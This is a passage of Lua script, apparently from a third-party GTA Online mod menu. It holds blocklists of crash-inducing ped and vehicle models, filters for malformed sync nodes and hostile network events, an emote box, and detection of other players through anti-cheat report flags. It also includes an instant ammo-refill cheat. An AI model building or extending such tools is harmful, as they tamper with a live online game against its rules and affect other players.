  "CS_ProlSec_24", "CS_TaoCheng6", "CS_Natalia", "CS_Tanisha", "cs_debra",
  "CS_JohnnyKlebitz", "CS_Manuel", "cs_gurk", "CS_Hunter", "CS_Milton", "CS_Terry",
  "CS_Patricia", "CS_Paper", "CS_Omega", "CS_LamarDavis", "CS_Solomon",
  "CS_DrFriedlander_35", "CS_Clay", "CS_Marnie", "CS_LesterCrest_2", "CS_Janet",
  "CS_Josef", "CS_ChengSr", "CS_MRK", "CS_LifeInvad_90", "cs_denise",
  "CS_MovPremMale", "CS_Old_Man9", "CS_Barry", "CS_RussianDrunk", "CS_Nigel",
  "CS_JoeMinuteMan", "CS_TomEpsilon", "CS_Floyd", "CS_Lazlow_6", "CS_Michelle",
  "CS_JimmyDiSanto5", "CS_SteveHains", "CS_Fabien", "CS_TennisCoach", "CS_Josh",
  "CS_NervousRon_80", "CS_LesterCrest", "CS_JimmyDiSanto", "CS_Tom", "CS_MaryAnn",
  "CS_Karen_Daniels", "CS_JewelAss", "CS_Devin", "CS_Casey", "CS_Bankman",
  "CS_MartinMadrazo_80", "CS_Andreas", "CS_TaosTranslator", "CS_Magenta",
  "CS_JimmyBoston", "CS_AmandaTownley", "CS_TaoCheng",
})

function PedProtection(isCreate, modelHash, _position, meta, nodes)
  local sourceName = playerLabel(meta.PlayerId)

  for _, node in ipairs(nodes) do
    if node:GetNodeType() == eSyncDataNode.CPedCreationDataNode then
      local pedNode = getNodeAs(node, "CPedCreationDataNode")
      if pedNode and isCreate then
        if isFreemodePedHash(modelHash) and shouldAllowPlayerPed(meta, pedNode) then
          return true
        end

        if blockedPedModels[pedNode.modelHash] then
          if isFeatureEnabled("notifyProtections") then
            notify(("Blocked Ped: %s from %s"):format(modelName(pedNode.modelHash), sourceName))
          end
          return false
        end
      end
    end
  end

  return true
end

bindCanApplyToggle("PedProt2", "Ped Spawn Protection", "Blocks spawning of known crash peds.", true, "pedHandler", PedProtection)

toBlockVehicles = hashSet({
  "cargoplane", "cargoplane4", "jet", "tug", "patrolboat", "kosatka", "chernobog",
  "hunter", "proptrailer", "starling", "towtruck", "towtruck1", "towtruck4", "towtruck2",
})

function vehProtection(isCreate, _modelHash, _position, meta, nodes)
  local sourceName = playerLabel(meta.PlayerId)
  local mode = isCreate and "CREATE" or "SYNC"

  for _, node in ipairs(nodes) do
    if node:GetNodeType() == eSyncDataNode.CVehicleCreationDataNode then
      local vehicleNode = getNodeAs(node, "CVehicleCreationDataNode")
      if vehicleNode and toBlockVehicles[vehicleNode.modelHash] then
        if isFeatureEnabled("notifyProtections") then
          notify(("Blocked Vehicle '%s' from %s [%s]"):format(modelName(vehicleNode.modelHash), sourceName, mode))
        end
        return false
      end
    end
  end

  return true
end

vehHandler1 = nil
bindCanApplyToggle("VehicleProt4", "Vehicle Spawn Protection", "Blocks spawning of known lag vehicles.", false, "vehHandler1", vehProtection)

emoteHotkeys = {
  BackSpace = {name = "BackSpace", key = 8},
  PageUp = {name = "PageUp", key = 33},
  PageDown = {name = "PageDown", key = 34},
  LeftArrow = {name = "LeftArrow", key = 37},
  UpArrow = {name = "UpArrow", key = 38},
  RightArrow = {name = "RightArrow", key = 39},
  DownArrow = {name = "DownArrow", key = 40},
  Insert = {name = "Insert", key = 45},
  Delete = {name = "Delete", key = 46},
  B = {name = "B", key = 66},
  C = {name = "C", key = 67},
  E = {name = "E", key = 69},
  F = {name = "F", key = 70},
  G = {name = "G", key = 71},
  H = {name = "H", key = 72},
  I = {name = "I", key = 73},
  J = {name = "J", key = 74},
  K = {name = "K", key = 75},
  L = {name = "L", key = 76},
  M = {name = "M", key = 77},
  N = {name = "N", key = 78},
  O = {name = "O", key = 79},
  P = {name = "P", key = 80},
  Q = {name = "Q", key = 81},
  R = {name = "R", key = 82},
  T = {name = "T", key = 84},
  U = {name = "U", key = 85},
  V = {name = "V", key = 86},
  X = {name = "X", key = 88},
  Y = {name = "Y", key = 89},
  Z = {name = "Z", key = 90},
  F1 = {name = "F1", key = 112},
  F2 = {name = "F2", key = 113},
  F3 = {name = "F3", key = 114},
  F4 = {name = "F4", key = 115},
  F5 = {name = "F5", key = 116},
  F6 = {name = "F6", key = 117},
  F7 = {name = "F7", key = 118},
  F8 = {name = "F8", key = 119},
  F9 = {name = "F9", key = 120},
  F10 = {name = "F10", key = 121},
  F11 = {name = "F11", key = 122},
  F12 = {name = "F12", key = 123},
  LeftShift = {name = "LeftShift", key = 160},
  RightShift = {name = "RightShift", key = 161},
  LeftCtrl = {name = "LeftCtrl", key = 162},
  RightCtrl = {name = "RightCtrl", key = 163},
}

emoteHotkeyList = {}
for _, hotkey in pairs(emoteHotkeys) do
  emoteHotkeyList[#emoteHotkeyList + 1] = hotkey
end
table.sort(emoteHotkeyList, function(left, right)
  return left.key < right.key
end)

emoteHotkeyNames = {}
for index, hotkey in ipairs(emoteHotkeyList) do
  emoteHotkeyNames[index] = hotkey.name
end

emoteOpenKey = FeatAdd(Utils.Joaat("EmoteOpenKey"), "Emote Open Key", eFeatureType.Combo, "Select key to open Emote Input")
callFeature(emoteOpenKey, "SetList", emoteHotkeyNames)
callFeature(emoteOpenKey, "SetListIndex", 7)

openval = FeatAdd(Utils.Joaat("open_emote_box"), "Open Emote Box", eFeatureType.Toggle, "Toggle the emote input")
emoteX = FeatAdd(Utils.Joaat("emote_x"), "Emote X Pos %", eFeatureType.SliderFloat, "Horizontal position")
emoteY = FeatAdd(Utils.Joaat("emote_y"), "Emote Y Pos %", eFeatureType.SliderFloat, "Vertical position")
inputColor = FeatAdd(Utils.Joaat("emote_input_color"), "Border Color", eFeatureType.InputColor4, "Window border color")
bgColor = FeatAdd(Utils.Joaat("BgColor"), "BG Color", eFeatureType.InputColor4, "Input window background")
InputText = FeatAdd(Utils.Joaat("InputTextColor"), "Input Text Color", eFeatureType.InputColor4, "Input field background")

callFeature(emoteX, "SetMinValue", 0)
callFeature(emoteX, "SetMaxValue", 1)
callFeature(emoteX, "SetValue", 0.5)
callFeature(emoteY, "SetMinValue", 0)
callFeature(emoteY, "SetMaxValue", 1)
callFeature(emoteY, "SetValue", 0.05)
callFeature(inputColor, "SetColor", 255, 0, 0, 255)
callFeature(InputText, "SetColor", 50, 50, 50, 255)
callFeature(bgColor, "SetColor", 30, 30, 30, 220)

windowWidth = 300
windowHeight = 35
inputBoxWidth = 280
inputBoxHeight = 25
focusRequested = false
borderThickness = 2
STRING_BUFFER = ""

function CheckEmoteHotkey()
  local selectedIndex = emoteOpenKey:GetListIndex() + 1
  local selectedName = emoteHotkeyNames[selectedIndex]
  local hotkey = selectedName and emoteHotkeys[selectedName] or nil

  if hotkey and Utils.IsKeyPressed(hotkey.key) then
    openval:SetBoolValue(true)
  end
end

function DrawWindowBorder(x, y, width, height, red, green, blue, alpha)
  ImGui.AddLine(x, y, x + width, y, red, green, blue, alpha, borderThickness)
  ImGui.AddLine(x + width, y, x + width, y + height, red, green, blue, alpha, borderThickness)
  ImGui.AddLine(x + width, y + height, x, y + height, red, green, blue, alpha, borderThickness)
  ImGui.AddLine(x, y + height, x, y, red, green, blue, alpha, borderThickness)
end

local function parseEmoteCommand(command)
  command = tostring(command or ""):gsub("^%s+", ""):gsub("%s+$", "")

  if command:find("^/e%s+") then
    local emoteName = command:gsub("^/e%s+", "")
    if emoteName == "c" or emoteName == "cancel" then
      Script.QueueJob(EmoteCancel)
      return true
    end

    local emoteData = Emotes[emoteName] or Dances[emoteName] or PropEmotes[emoteName]
    if emoteData then
      Script.QueueJob(OnEmotePlay, emoteData)
      return true
    end

    notify(("'%s' is not a valid emote."):format(emoteName))
    return true
  end

  if command:find("^/dance") then
    local danceName = command:gsub("^/dance%s*", "")
    Script.QueueJob(playDance, danceName)
    return true
  end

  return false
end

function emotetext()
  if not openval:GetBoolValue() then
    focusRequested = false
    return
  end

  local displayWidth, displayHeight = ImGui.GetDisplaySize()
  local x = (displayWidth * emoteX:GetFloatValue()) - (windowWidth / 2)
  local y = displayHeight * emoteY:GetFloatValue()
  local borderR, borderG, borderB, borderA = inputColor:GetColor()
  local bgR, bgG, bgB, bgA = bgColor:GetColor()
  local inputR, inputG, inputB, inputA = InputText:GetColor()

  ImGui.AddRectFilled(x, y, x + windowWidth, y + windowHeight, bgR, bgG, bgB, bgA)
  DrawWindowBorder(x, y, windowWidth, windowHeight, borderR, borderG, borderB, borderA)
  ImGui.SetNextWindowPos(x, y, ImGuiCond.Always)
  ImGui.SetNextWindowSize(windowWidth, windowHeight, ImGuiCond.Always)
  ImGui.PushStyleColor(ImGuiCol.FrameBg, inputR / 255, inputG / 255, inputB / 255, inputA / 255)

  local opened = ImGui.Begin("Emote Input", true, ImGuiWindowFlags.NoTitleBar | ImGuiWindowFlags.NoResize | ImGuiWindowFlags.NoMove | ImGuiWindowFlags.NoBackground | ImGuiWindowFlags.NoSavedSettings)
  if opened then
    local lineHeight = ImGui.GetTextLineHeight()
    ImGui.SetCursorPosX((windowWidth - inputBoxWidth) / 2)
    ImGui.SetCursorPosY(((windowHeight - lineHeight) / 2) - 3)

    if not focusRequested then
      ImGui.SetKeyboardFocusHere()
      focusRequested = true
    end

    ImGui.PushItemWidth(inputBoxWidth)
    local inputValue, submitted = ImGui.InputText("##emote_input", STRING_BUFFER, ImGuiInputTextFlags.EnterReturnsTrue)
    if submitted then
      STRING_BUFFER = inputValue
    end
    ImGui.PopItemWidth()

    if submitted and ImGui.IsKeyPressed(ImGuiKey.Enter) then
      if not parseEmoteCommand(STRING_BUFFER) then
        notify("Invalid command: use /e or /dance.")
      end
      openval:SetBoolValue(false)
      STRING_BUFFER = ""
    end

    if ImGui.IsMouseClicked(0) and not ImGui.IsWindowHovered() then
      focusRequested = false
    end
  end

  ImGui.PopStyleColor()
  ImGui.End()
end

function onChatMessage(sender, message)
  if sender == nil or sender.PlayerId ~= GTA.GetLocalPlayerId() then
    return
  end

  if parseEmoteCommand(message) then
    return true
  end
end

pcall(EventMgr.RegisterHandler, eLuaEvent.ON_PRESENT, emotetext)
pcall(EventMgr.RegisterHandler, eLuaEvent.ON_CHAT_MESSAGE, onChatMessage)
Script.RegisterLooped(CheckEmoteHotkey)
Script.RegisterLooped(CancelEmotesTick)

vehicleTaskValidators = {
  [455] = function(vehicleInfo) return vehicleInfo:IsPlane() end,
  [456] = function(vehicleInfo) return vehicleInfo:IsHeli() end,
  [457] = function(vehicleInfo) return vehicleInfo:IsSubmarine() end,
  [458] = function(vehicleInfo) return vehicleInfo:IsBoat() end,
  [481] = function(vehicleInfo) return vehicleInfo:IsPlane() or vehicleInfo:IsHeli() end,
  [482] = function(vehicleInfo) return vehicleInfo:IsHeli() end,
  [483] = function(vehicleInfo) return vehicleInfo:IsPlane() end,
  [489] = function(vehicleInfo) return vehicleInfo:IsHeli() end,
  [490] = function(vehicleInfo) return vehicleInfo:IsBoat() end,
  [492] = function(vehicleInfo) return vehicleInfo:IsHeli() end,
  [498] = function(vehicleInfo) return vehicleInfo:IsSubmarineCar() end,
  [499] = function(vehicleInfo) return vehicleInfo:IsnAmphibiousQuadbike() end,
  [504] = function(vehicleInfo) return vehicleInfo:IsTrain() end,
}

vehicleTaskNames = {
  [455] = "GoToPlane",
  [456] = "GoToHelicopter",
  [457] = "GoToSubmarine",
  [458] = "GoToBoat",
  [481] = "VehicleTask",
  [482] = "VehicleLand",
  [483] = "LandPlane",
  [489] = "PoliceBehaviourHelicopter",
  [490] = "PoliceBehaviourBoat",
  [492] = "HeliProtect",
  [498] = "DriveSubmarineCar",
  [499] = "DriveAmphibiousAutomobile",
  [504] = "PlayerDriveTrain",
}

taskPatchAnimalModels = hashSet({
  "A_C_Chickenhawk", "A_C_Deer", "A_C_Dolphin", "A_C_KillerWhale", "A_C_Pigeon",
  "A_C_Rabbit_12", "A_C_Cow", "A_C_Seagull", "A_C_Chop", "A_C_Stingray",
  "A_C_SharkTiger", "A_C_Fish", "A_C_Poodle", "A_C_SharkHammer", "A_C_MtLion",
  "A_C_Cat_23", "A_C_Westy", "A_C_Rottweiler", "A_C_Coyote", "A_C_Retriever",
  "A_C_Husky", "A_C_MtLion_24", "A_C_Cormorant", "A_C_Pug", "A_C_Pig",
  "A_C_Boar", "A_C_Chop_91", "A_C_Pug_13", "A_C_Hen", "A_C_HumpBack",
  "A_C_Rat", "A_C_Coyote_57", "A_C_Rabbit_13", "A_C_shepherd", "A_C_Cat_13",
  "A_C_Boar_24", "A_C_Rottweiler_24", "A_C_Panther",
})

allowedAnimalTaskTypes = {
  [97] = true,
  [120] = true,
  [215] = true,
  [216] = true,
  [217] = true,
  [218] = true,
  [219] = true,
  [273] = true,
  [274] = true,
  [278] = true,
  [279] = true,
  [319] = true,
  [320] = true,
  [532] = true,
}

local function notifyProtection(message)
  if isFeatureEnabled("notifyProtections") then
    notify(message)
  end
end

local function getEntityVehicleInfo(meta)
  local entity = meta.GetEntity and meta:GetEntity() or nil
  if not entity or not entity.IsVehicle or not entity:IsVehicle() or not entity.ModelInfo then
    return entity, nil
  end

  local ok, info = pcall(CVehicleModelInfo.FromBaseModelInfo, entity.ModelInfo)
  if not ok or not info then
    return entity, nil
  end

  return entity, info
end

function taskPatch(isCreate, modelHashValue, _position, meta, nodes)
  local entity, vehicleInfo = getEntityVehicleInfo(meta)
  local sourceName = playerLabel(meta.PlayerId)

  if entity and entity.IsVehicle and entity:IsVehicle() and entity.ModelInfo and not vehicleInfo then
    notifyProtection(("Blocked Invalid Entity Info from %s"):format(sourceName))
    return false
  end

  for _, node in ipairs(nodes) do
    local nodeType = node:GetNodeType()

    if nodeType == eSyncDataNode.CVehicleTaskDataNode then
      local taskNode = getNodeAs(node, "CVehicleTaskDataNode")
      if taskNode then
        if taskNode.taskDataSize and taskNode.taskDataSize > 255 then
          notifyProtection(("Blocked Task Data Overflow: %d from %s"):format(taskNode.taskDataSize, sourceName))
          return false
        end

        local validator = vehicleTaskValidators[taskNode.taskType]
        if validator and vehicleInfo and not validator(vehicleInfo) then
          notifyProtection(("Blocked Task Mismatch: %s (%s|%s|%d) from %s"):format(
            vehicleTaskNames[taskNode.taskType] or "Unknown",
            modelName(modelHashValue),
            eNetObjectTypeNames[meta.ObjectType] or "UNKNOWN",
            taskNode.taskType,
            sourceName
          ))
          return false
        end
      end
    elseif nodeType == eSyncDataNode.CVehicleProximityMigrationDataNode then
      local migrationNode = getNodeAs(node, "CVehicleProximityMigrationDataNode")
      if migrationNode then
        if migrationNode.taskMigrationDataSize and migrationNode.taskMigrationDataSize > 255 then
          notifyProtection(("Blocked Task Migration Data Overflow: %d from %s"):format(migrationNode.taskMigrationDataSize, sourceName))
          return false
        end

        local validator = vehicleTaskValidators[migrationNode.taskType]
        if validator and vehicleInfo and not validator(vehicleInfo) then
          notifyProtection(("Blocked Task Migration Mismatch: %s (%s|%s|%d) from %s"):format(
            vehicleTaskNames[migrationNode.taskType] or "Unknown",
            modelName(modelHashValue),
            eNetObjectTypeNames[meta.ObjectType] or "UNKNOWN",
            migrationNode.taskType,
            sourceName
          ))
          return false
        end
      end
    elseif nodeType == eSyncDataNode.CPedTaskTreeDataNode then
      local taskTreeNode = getNodeAs(node, "CPedTaskTreeDataNode")
      if taskTreeNode and taskTreeNode.taskTreeData and #taskTreeNode.taskTreeData > 0 and taskPatchAnimalModels[modelHashValue] then
        local taskType = taskTreeNode.taskTreeData[1].taskType
        if not allowedAnimalTaskTypes[taskType] then
          local action = isCreate and "Create" or "Sync"
          notifyProtection(("Invalid Animal Task %s [%s] on %s from %s"):format(action, tostring(taskType), modelName(modelHashValue), sourceName))
          return false
        end
      end
    end
  end

  return true
end

bindCanApplyToggle("crashProt1", "Crash Protection", "Blocks malformed task and migration sync nodes.", true, "taskPatchHandler", taskPatch)

local function bindNetEventToggle(featureId, label, description, defaultValue, handlerName, handler)
  local feature
  feature = FeatAdd(Utils.Joaat(featureId), label, eFeatureType.Toggle, description, function(toggle)
    if toggle:IsToggled() then
      if _ENV[handlerName] == nil then
        _ENV[handlerName] = EventMgr.RegisterHandler(eLuaEvent.NET_EVENT, handler)
      end
    elseif _ENV[handlerName] ~= nil then
      EventMgr.RemoveHandler(_ENV[handlerName])
      _ENV[handlerName] = nil
    end
  end)

  setDefaultAndReset(feature, defaultValue, true)
  return feature
end

explosionHandler = nil
function blockExplosions1(sender, eventId)
  if ShouldUnload() or sender == nil then
    return
  end

  if eventId == 17 then
    notifyProtection(("Blocked Explosion from: %s"):format(sender:GetName()))
    return true
  end

  if eventId == 16 then
    notifyProtection(("Blocked Fire from: %s"):format(sender:GetName()))
    return true
  end
end

bindNetEventToggle("blockExplos3", "Block Explosions", "Blocks explosion and fire network events.", false, "explosionHandler", blockExplosions1)

PTFXHandler = nil
function blockPTFX1(sender, eventId, reader)
  if ShouldUnload() or sender == nil then
    return
  end

  if eventId == 33 and reader then
    local value, ok = reader:ReadUns(4)
    if ok and value == 4 then
      notifyProtection(("Blocked PTFX #3 from: %s"):format(sender:GetName()))
      return true
    end
  end

  if eventId == 74 then
    notifyProtection(("Blocked PTFX from: %s"):format(sender:GetName()))
    return true
  end
end

bindNetEventToggle("blockPTFX9", "Block PTFX", "Blocks particle effect network events.", false, "PTFXHandler", blockPTFX1)

entityCreationLoggerHandler = nil
function entityCreationLogger(isCreate, modelHashValue, _position, meta, nodes)
  if not isCreate then
    return true
  end

  local sourceName = playerLabel(meta.PlayerId)
  Logger.Log(eLogColor.LIGHTGREEN, "CREATE", ("Model: %s From: %s"):format(modelName(modelHashValue), sourceName))

  for _, node in ipairs(nodes) do
    if node.GetNodeName then
      Logger.LogInfo(" - " .. node:GetNodeName())
    end
  end

  return true
end

bindCanApplyToggle("entityCreationLogger", "Log Entity Creations", "", false, "entityCreationLoggerHandler", entityCreationLogger)

warningScreenMessages = {
  HUD_MPBAILMESG = "Lost connection to session due to an unknown network error; returning to singleplayer.",
  HUD_ENDKICK = "You are already kicked from this session; returning to singleplayer.",
  HUD_TIMEJOIN = "Timed out joining this session; returning to singleplayer.",
  HUD_TIMEST = "Timed out downloading player data; returning to singleplayer.",
  HUD_TIMEFIN = "Timed out initializing session; returning to singleplayer.",
  HUD_TIMEWAIT = "Timed out locating session; returning to singleplayer.",
  HUD_MPTIMOUT = "Connecting to the session has timed out; returning to singleplayer.",
  DELETESAVEFAIL = "Rockstar cloud save error while deleting your character; returning to singleplayer.",
  HUD_BAILSC = "There has been an error joining a session; returning to singleplayer.",
  HUD_PLUGPU = "Internet connection has been lost; returning to singleplayer.",
  HUD_BAIL5 = "A sign-in change has occurred; returning to singleplayer.",
  HUD_BAIL7 = "New content has been installed; returning to singleplayer.",
  HUD_BAIL6 = "Failed to find a compatible GTA Online session; returning to singleplayer.",
  HUD_BAIL3 = "Failed to host a GTA Online session; returning to singleplayer.",
  HUD_BAIL2 = "Failed to join intended GTA Online session; returning to singleplayer.",
  HUD_BAIL8 = "Connection to the session host has been lost; returning to singleplayer.",
  HUD_BAIL43 = "Failed to host a GTA Online party; returning to singleplayer.",
  HUD_BAIL11 = "Failed to join intended GTA Online party; returning to singleplayer.",
  HUD_BAIL78 = "Timed out joining GTA Online; returning to singleplayer.",
  HUD_BAIL24 = "Connection to the active GTA Online session was lost; returning to singleplayer.",
  HUD_BAIL36 = "Timed out when launching the activity; returning to singleplayer.",
  HUD_BAIL37 = "Timed out when leaving the active GTA Online session; returning to singleplayer.",
  HUD_BAIL50 = "Timed out matchmaking for a compatible GTA Online session.",
  HUD_ROSBANNED = "You have been banned from Grand Theft Auto Online.",
  HUD_MM_FAIL = "The Rockstar Matchmaking Service failed to find a suitable match.",
  HUD_BAIL_REVOKED = "Removed from GTA Online because you do not have the correct permissions.",
  HUD_BAIL_SUSPEND = "Removed from GTA Online because the game was suspended too long.",
  HUD_SUSPEND = "Connection to the session was lost because the application was suspended.",
  HUD_RESIGN = "You were logged out of Rockstar Games.",
  HUD_UPDATEBAIL = "Removed from GTA Online because you do not have the latest patch.",
  BAIL_TEAMFUL7 = "The session you are trying to join is currently full.",
  HUD_JIPFAILMSG = "Player is no longer in session.",
  BAIL_SESSGONE = "The session you are trying to join no longer exists.",
  HUD_SOCMATFAIL = "Unable to join session; Rockstar cloud servers are unavailable.",
  BAIL_BLACKLIST = "You have already been voted out of this game session.",
  BAIL_COMPATASSE = "Failed to join session due to incompatible assets.",
  HUD_CLOUDOFFLIN = "Rockstar Games Online Services are unavailable.",
  HUD_ESTAB = "Unable to connect to session; the session may no longer exist.",
  HUD_REPUTATION = "Unable to join this session because your account has a bad reputation.",
  BAIL_CHEATONLY = "The session you are trying to join is for cheaters only.",
  BAIL_BADSPONLY = "The session you are trying to join is for bad sports only.",
  BAIL_NORMBAD = "The session you are trying to join is not for bad sports.",
  BAIL_NORMCHT = "The session you are trying to join is not for cheaters.",
  BAIL_DIFFCONT = "The session you are trying to join is not using the same content.",
  BAIL_DIFFBUILD = "The session you are trying to join is a different build type.",
  BAIL_FRIENDSONLY = "The session you are trying to join is friends only.",
  BAIL_PRIVONLYAUTHFAILED = "The session is private and friends only; you must be invited by a friend.",
  BAIL_PRIVONLY = "The session is private; you need an invite.",
}

local function isWarningHashInList(hash, values)
  for _, value in ipairs(values) do
    if value == hash then
      return true
    end
  end
  return false
end

function skipAlerts()
  if not isFeatureEnabled("acceptAlerts") or ShouldUnload() then
    Script.Yield(500)
    return
  end

  local warningHash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
  local message = nil

  for warningName, warningMessage in pairs(warningScreenMessages) do
    if warningHash == Utils.sJoaat(warningName) then
      message = warningMessage
      break
    end
  end

  if isWarningHashInList(warningHash, transactionWarnings) then
    message = "Skipping transaction warning alert."
  elseif warningHash == 1670923214 then
    message = "Failed to join intended session; joining a new GTA Online session."
  elseif warningHash == -587688989 or warningHash == 15890625 then
    Logger.Log(eLogColor.GREEN, "K-Script", "Skipping Join Alert Message...")
  elseif warningHash == -2053786350 then
    message = "Unable to connect to game session."
  end

  if message then
    notify(message)
    Script.Yield(5)
  end

  if warningHash ~= 0 then
    PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1)
    Script.Yield(10)
  end

  Script.Yield(500)
end

function readGameEvents()
  if not isFeatureEnabled("dbug") then
    Script.Yield(5000)
    return
  end

  if ShouldUnload() then
    return
  end

  local eventId = SCRIPT.GET_EVENT_AT_INDEX(1, 0)
  if eventId == -1 then
    Script.Yield(50)
    return
  end

  local buffer = Memory.Alloc(448)
  if buffer == nil then
    Script.Yield(10)
    return
  end

  if eventId == 226 then
    notify("The game is requesting tunables from the cloud servers.")
  elseif eventId == 161 then
    notify("You have been desync kicked.")
  elseif eventId == 160 then
    notify("You have been removed from the session due to a long game stall.")
  elseif eventId == 169 then
    notify("The invite you sent successfully arrived.")
  elseif eventId == 153 or eventId == 154 then
    Memory.MemSet(buffer, 0, 448)
    if SCRIPT.GET_EVENT_DATA(1, 0, buffer, 56) then
      local playerName = Memory.ReadString(buffer)
      local scriptId = Memory.ReadInt(buffer + 168)
      local scriptName = SCRIPT.GET_NAME_OF_SCRIPT_WITH_THIS_ID(scriptId)
      if eventId == 153 then
        notify(("%s has joined Script: %s"):format(playerName, scriptName))
      else
        notify(("%s has left Script: %s"):format(playerName, scriptName))
      end
    end
  elseif eventId == 184 then
    Memory.MemSet(buffer, 0, 448)
    if SCRIPT.GET_EVENT_DATA(1, 0, buffer, 2) then
      local success = Memory.ReadInt(buffer) == 1
      notify(("Session Join Succeeded? (%s)"):format(success and "Success!" or "Failed!"))
    end
  end

  Memory.Free(buffer)
  Script.Yield(50)
end

function disableRIDJoinLoop()
  local poolFeatureValue = FeatureMgr.GetFeature(Utils.Joaat("poolToggle"))
  if poolFeatureValue and not isAdmin and isFeatureEnabled("poolToggle") then
    for _, hash in ipairs({238683028, 872788705}) do
      local feature = FeatureMgr.GetFeature(hash)
      if feature and feature:IsToggled() then
        feature:Toggle()
      end
    end
  end

  Script.Yield(30000)
end

function protectionLoop()
  if ShouldUnload() then
    return
  end

  Script.Yield(100)
end

function updateHostInfo()
  hostIndex = NETWORK.NETWORK_GET_HOST_PLAYER_INDEX()
  scriptHostIndex = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("freemode", -1, 0)
  hostName = Players.GetName(hostIndex)
  scriptHostName = Players.GetName(scriptHostIndex)
  numConnectedPlayers = NETWORK.NETWORK_GET_NUM_CONNECTED_PLAYERS()
  areWeHost = NETWORK.NETWORK_IS_HOST()

  if isFeatureEnabled("skipreload") then
    local ped = PLAYER.GET_PLAYER_PED(GTA.GetLocalPlayerId())
    if PED.IS_PED_RELOADING(ped) then
      WEAPON.REFILL_AMMO_INSTANTLY(ped)
    end
  end

  currentRegionName = regionAddress and regionNames[Memory.ReadInt(regionAddress)] or "Unknown"
  currentNatTypeName = natTypeAddress and natTypes[Memory.ReadInt(natTypeAddress)] or "Unknown"

  for playerId = 0, 31 do
    if isNetPlayerOk(playerId, false, true) and NETWORK.NETWORK_PLAYER_HAS_HEADSET(playerId) then
      local suffix = playerId == GTA.GetLocalPlayerId() and " (You)" or ""
      if NETWORK.NETWORK_IS_PLAYER_TALKING(playerId) then
        suffix = suffix .. " (Talking)"
      end
      voiceChatters[playerId] = (Players.GetName(playerId) or ("Player " .. playerId)) .. suffix
    else
      voiceChatters[playerId] = nil
    end
  end

  Script.Yield(500)
end

local function setDetectedPlayer(playerId, name, reason)
  detectedPlayerNames[playerId + 1] = name or Players.GetName(playerId)
  detectedPlayerReasons[playerId + 1] = reason
end

local function clearDetectedPlayer(playerId)
  detectedPlayerNames[playerId + 1] = nil
  detectedPlayerReasons[playerId + 1] = nil
end

function IsPlayerFriend(playerId)
  if ShouldUnload() then
    return false
  end

  Script.Yield(1000)
  local tags = Players.GetTags(playerId) or ""
  return tags:find("%[F%]") ~= nil
end

local reportReasons = {
  {key = "CODE_TAMPERING", label = "Code Tampering"},
  {key = "CRC_CODE_CRCS", label = "Invalid CRC Code Check"},
  {key = "CRC_COMPROMISED", label = "Compromised CRC Check"},
  {key = "CRC_EXE_SIZE", label = "Modified Application size"},
  {key = "CRC_NOT_REPLIED", label = "CRC Check did not reply"},
  {key = "CRC_REQUEST_FLOOD", label = "CRC Check Request Flood"},
  {key = "GAME_SERVER_CASH_BANK", label = "Cash Tamper (Bank)"},
  {key = "GAME_SERVER_CASH_WALLET", label = "Cash Tamper (Wallet)"},
  {key = "GAME_SERVER_INVENTORY", label = "Inventory Tamper"},
  {key = "GAME_SERVER_SERVER_INTEGRITY", label = "Game Server Integrity Check failed"},
  {key = "SCRIPT_CHEAT_DETECTION", label = "Cheat Detected"},
  {key = "TELEMETRY_BLOCK", label = "Blocking Telemetry"},
}

function logGamerInfo(playerId)
  if ShouldUnload() or playerId == GTA.GetLocalPlayerId() then
    return
  end

  if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(Utils.Joaat("MainTransition")) > 0 then
    return
  end

  local player = Players.GetById(playerId)
  if not player or not player.PlayerInfo then
    return
  end

  local name = player:GetName()
  local gamerInfo = player:GetGamerInfo()
  if not gamerInfo then
    return
  end

  local ped = Players.GetCPed(playerId)
  if ped and ped.CurVehicle and ped.CurVehicle.ModelInfo then
    local vehicle = GTA.PointerToHandle(ped.CurVehicle)
    local scriptName = ENTITY.GET_ENTITY_SCRIPT(vehicle)
    if scriptName == "main_persistent" and detectedPlayerReasons[playerId + 1] == nil and isDev then
      notify(("Detected %s as likely external-menu user"):format(name))
      setDetectedPlayer(playerId, name, "likely external-menu user")
    end

    if isFeatureEnabled("antiopressorloop") and (ped.CurVehicle.ModelInfo.Model == Utils.Joaat("oppressor") or ped.CurVehicle.ModelInfo.Model == Utils.Joaat("oppressor4")) then
      if not (isFeatureEnabled("exclfriendsantiopressorloop") and IsPlayerFriend(playerId)) then
        notify(("Player %s is using an Oppressor"):format(name))
      end
    end
  end

  if detectedPlayerNames[playerId + 1] and detectedPlayerNames[playerId + 1] ~= name then
    clearDetectedPlayer(playerId)
  end

  if detectedPlayerReasons[playerId + 1] == "Rockstar Administrator" or detectedPlayerReasons[playerId + 1] == "Rockstar Anti Cheat" then
    return
  end

  if eReportReason and player.IsReportBitSet then
    for _, reason in ipairs(reportReasons) do
      local reportBit = eReportReason[reason.key]
      if reportBit and player:IsReportBitSet(reportBit) then
        notify(("%s was detected by RAC, Reason: %s"):format(name, reason.label))
        setDetectedPlayer(playerId, name, "Rockstar Anti Cheat")
        ModderDB.AddModderByPlayerId(playerId, "Rockstar Anti Cheat")
        Script.Yield()
        return
      end
    end
  end

  local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerId)
  if playerPed then
    if PED.GET_PED_CONFIG_FLAG(playerPed, 141, true) and PED.GET_PED_CONFIG_FLAG(playerPed, 144, true) then
      if detectedPlayerReasons[playerId + 1] == nil then
        notify(("Detected %s for DaiveKit User"):format(name))
      end
      setDetectedPlayer(playerId, name, "DaiveKit User")
    end

    local health = ENTITY.GET_ENTITY_HEALTH(playerPed)
    if health < 0 and ENTITY.GET_ENTITY_SPEED(playerPed) > 1 and not PED.IS_PED_RAGDOLL(playerPed) then
      if detectedPlayerReasons[playerId + 1] == nil then
        notify(("Detected %s Undead OTR"):format(name))
      end
      setDetectedPlayer(playerId, name, "Undead OTR")
    end
  end

  if player.PlayerInfo.MaxHealth > 328 or player.PlayerInfo.MaxHealth == 175 then
    if detectedPlayerReasons[playerId + 1] == nil then
      notify(("Detected %s for Modded Health %d"):format(name, player.PlayerInfo.MaxHealth))
    end
    setDetectedPlayer(playerId, name, ("Modded Health (%i)"):format(player.PlayerInfo.MaxHealth))
  end

  if player.PlayerInfo.MaxArmour > 50 and player.PlayerInfo.MaxArmour ~= 100 then
    if detectedPlayerReasons[playerId + 1] == nil then
